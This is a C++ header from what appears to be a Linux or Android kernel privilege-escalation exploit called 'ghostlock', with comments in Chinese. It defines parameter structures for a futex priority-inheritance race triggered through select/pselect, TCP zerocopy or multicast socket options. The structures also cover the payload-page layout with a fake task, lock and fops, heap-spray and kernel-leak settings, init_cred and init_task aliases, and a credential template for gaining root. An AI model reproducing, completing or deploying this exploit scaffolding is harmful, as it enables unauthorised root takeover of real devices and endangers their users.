/**
 * @file params.h
 * @brief 6 个 cmp_disasm 目标函数及其下一层的纯输入结构（无全局、无类依赖）。
 *
 * 规则：目标函数只通过这些 POD 读取输入，不再访问 `g_exploit_session`、
 * `profile` 单例、`kernel::` 常量或任何项目宏常量；系统 ABI 宏
 * （FUTEX_*、SYS_*）与 syscall/glibc/PI 原语不受限。
 *
 * @note 每个结构只负责一个物理入口的输入面；新增字段必须来自调用方。
 */
#ifndef GHOSTLOCK_CORE_PARAMS_H
#define GHOSTLOCK_CORE_PARAMS_H

#include <array>
#include <atomic>
#include <cstdint>

#include "memory.h"
#include "profile.h"

namespace ghostlock::core {
    /** @brief payload 页上由 Kotlin/会话决定的一组地址。 */
    struct PageParams final {
        std::uintptr_t base;
        std::uintptr_t last_mm_struct;
        std::uintptr_t fake_lock;
        std::uintptr_t fake_w0;
        std::uintptr_t fake_task;
        std::uintptr_t fake_parent;
        std::uintptr_t fake_right;
        std::uintptr_t fake_left;
        std::uintptr_t fake_fops;
    };

    /** @brief PI 竞态的跨线程共享量；只借用，不拥有。 */
    struct RacePointers final {
        std::atomic<std::int32_t> *consumer_calls;
        std::atomic<std::int32_t> *consumer_success;
        std::atomic<std::int32_t> *consumer_stop;
        std::atomic<std::int32_t> *consumer_go;
        std::atomic<std::int32_t> *consumer_inflight;
        std::atomic<std::int32_t> *waiter_tid;
        std::atomic<std::int32_t> *waiter_ready;
        std::atomic<std::int32_t> *waiter_waiting;
        std::atomic<std::int32_t> *owner_started;
        std::atomic<std::int32_t> *owner_chain_done;
        std::atomic<std::int32_t> *owner_stop;
        std::atomic<std::int32_t> *route_done;
        std::atomic<std::int32_t> *fast_repair;
        std::atomic<std::uint32_t> *route_delay_usec;
    };

    /** @brief multicast（`MCAST_BLOCK_SOURCE`）物理入口的全部输入。 */
    struct MulticastInputs final {
        ghostlock::profile::MulticastWaiterLayout layout;
        std::uintptr_t fake_task;
        std::uintptr_t fake_lock;
        std::atomic<std::int32_t> *consumer_calls;
        std::atomic<std::int32_t> *consumer_success;
        std::atomic<std::int32_t> *consumer_stop;
        std::atomic<std::int32_t> *consumer_go;
        std::atomic<std::int32_t> *consumer_inflight;
        std::atomic<std::uint32_t> *route_delay_usec;
        std::int32_t attempts;
        std::int32_t arm_sequence;
        std::int32_t arm_hold;
        /**
         * @brief 拷贝缓冲区里 `group_source_req.gsr_group.ss_family` 的字节偏移。
         *
         * @note 内核在完成整段拷贝后才检查该地址族；偏移由 profile 决定，
         *       缺失即拒绝发射（不猜落点）。
         */
        std::size_t sockaddr_family_offset;
    };

    /**
     * @brief payload 页喷射的全部输入（借用会话堆槽，写回仍落在原槽）。
     *
     * @note `profile`/`addresses` 只读借用；`current`/`prepare` 等指向调用方
     *       拥有的槽位，函数只改内容不换所有者。
     */
    struct PageSprayInputs final {
        ghostlock::memory::PayloadPage *current;
        ghostlock::memory::PayloadPage *prebuilt;
        ghostlock::memory::PayloadPage *quarantine;
        ghostlock::memory::MmContextSet *prepare;
        ghostlock::memory::MmContextSet *spray;
        ghostlock::memory::MmContextSet *pre;
        ghostlock::memory::MmContextSet *post;
        ghostlock::support::ChildProcess *leak_child;
        ghostlock::support::UniqueFd *leak_memfd;
        std::unique_ptr<unsigned char[]> *skb_buffer;
        void **snitch;  /* 借用的 opaque 句柄槽（KernelSnitch，见 ks_bridge.h） */
        std::size_t *mm_objs_per_slab;
        ghostlock::memory::WriteRequest request;
        std::int32_t main_cpu;
        std::uint32_t mm_struct_sz;
        std::uint32_t prepare_max_attempts;
        std::uint32_t prepare_timeout_ms;
        std::uint32_t kernelsnitch_timeout_ms;
        std::uint32_t kernelsnitch_collisions;
        std::int32_t compact_waiter;
        std::uintptr_t init_cred_alias;
        std::uintptr_t init_task_alias;
        std::uintptr_t root_task_group_alias;
        std::uintptr_t direct_map_end;
        std::int32_t tcp_payload_layout;
        std::uintptr_t ref_image_alias[4];
        std::uint32_t compact_task_prio_off;
        std::uint32_t compact_task_normal_prio_off;
        std::uint32_t compact_task_task_group_off;
        std::uint32_t compact_task_pi_lock_off;
        std::uint32_t compact_task_pi_waiters_off;
        std::uint32_t compact_task_pi_top_task_off;
        std::uint32_t compact_task_pi_blocked_off;
        std::uint32_t fake_task_prio_off;
        std::uint32_t fake_task_normal_prio_off;
        std::uint32_t fake_task_task_group_off;
        std::uint32_t fake_task_pi_lock_off;
        std::uint32_t fake_task_pi_waiters_off;
        std::uint32_t fake_task_pi_top_task_off;
        std::uint32_t fake_task_pi_blocked_off;
        ghostlock::profile::CredTemplate credential;
    };

    /** @brief select/pselect 物理入口的全部输入。 */
    struct SelectInputs final {
        PageParams page;
        RacePointers race;
        ghostlock::memory::WriteRequest request;
        std::int32_t waiter_shift;
        std::int32_t compact_waiter;
        std::uint32_t timeout_us;
        std::uint32_t enter_delay_us;
        std::uint32_t waiter_prio;
        std::int32_t nfds;
        std::array<std::int32_t, 3> stdio_backup;
        const PageSprayInputs *spray;
        /* compact 重试次数 / plain 单发次数。 */
        std::uint32_t attempts_compact;
        std::uint32_t attempts_plain;
        /* disarm 等待 consumer 退出的轮次与间隔（原 2000 × 1000us）。 */
        std::uint32_t disarm_spin;
        std::uint32_t disarm_poll_us;
        /* compact 延迟阶梯；空指针或长度 0 表示只用 enter_delay_us。 */
        const std::uint32_t *delay_ladder;
        std::uint32_t delay_ladder_len;
        /* waiter 布局字面量（内核结构编码，由 profile 提供）。 */
        std::uint64_t waiter_wake_prio_low_bits;
        std::uint64_t waiter_tree_prio;
        std::uint64_t waiter_pi_prio;
        std::uint64_t waiter_wake_state;
    };

    /**
     * @brief compact pselect 的延迟阶梯（过渡投影值）。
     *
     * @note TODO(P3-kotlin-params)：Kotlin 传参落地后由 profile 提供并删除。
     *       只被 `*_from_session` 适配器引用；目标函数只读 `SelectInputs`。
     */
    inline constexpr std::array<std::uint32_t, 8> kSelectDelayLadderUs = {
        50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
    };

    /** @brief TCP zerocopy 物理入口的全部输入。 */
    struct TcpInputs final {
        PageParams page;
        RacePointers race;
        ghostlock::memory::WriteRequest request;
        std::uint32_t attempts;
        std::uint32_t arm_sequence;
        std::uint32_t post_hold;
        std::size_t mapping_length;
        std::uintptr_t waiter_task;
        /* getsockopt(TCP_ZEROCOPY_RECEIVE) 请求体的尺寸与字段偏移。 */
        std::size_t zerocopy_request_size;
        std::size_t zc_address_offset;
        std::size_t zc_length_offset;
        std::size_t zc_task_offset;
        std::size_t zc_lock_offset;
        /* 发送端小包（把数据塞进接收队列，zerocopy 才有东西可收）。 */
        std::size_t sendbuf_size;
        std::uint32_t sendbuf_fill;
        /* punch 相位等待的自旋上限，以及每 N 次尝试的日志节拍。 */
        std::uint32_t punch_phase_spin;
        std::uint32_t log_every;
        /* 映射预填充字节。 */
        std::uint8_t mapping_fill;
    };

    /** @brief 三种物理机制的统一入口选择。 */
    struct RouteInputs final {
        std::int32_t kind;           /* 0 select, 1 tcp, 2 multicast */
        std::int32_t fallback_kind;  /* -1 = 无回退 */
        SelectInputs select;
        TcpInputs tcp;
        MulticastInputs multicast;
    };
} // namespace ghostlock::core

#endif // GHOSTLOCK_CORE_PARAMS_H
